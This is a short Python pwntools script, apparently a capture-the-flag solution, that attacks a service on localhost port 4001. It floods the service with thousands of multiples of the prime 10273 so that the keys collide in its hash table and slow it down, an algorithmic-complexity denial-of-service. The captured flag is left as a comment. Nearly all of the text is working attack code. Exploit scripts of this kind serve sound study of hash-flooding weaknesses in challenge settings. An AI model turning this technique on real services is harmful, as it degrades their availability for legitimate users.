from pwn import *

p = remote("localhost", 4001)
lines = []
row = []
prime = 10273 
# 20753 also not bad
for i in range(1,10000-50):
    row.append(str(i*10273))
    if i % 10 == 0:
        lines.append('1')
        lines.append(' '.join(row))
        row.clear()
# lines.append('2')
for str_line in lines:
    p.sendline(str_line.encode('utf-8'))
p.interactive()


# REP{wait_they_told_me_that_a_hashmapis_O(1)_c96b99e3bee4e7e924c66baa7cc50f1c}
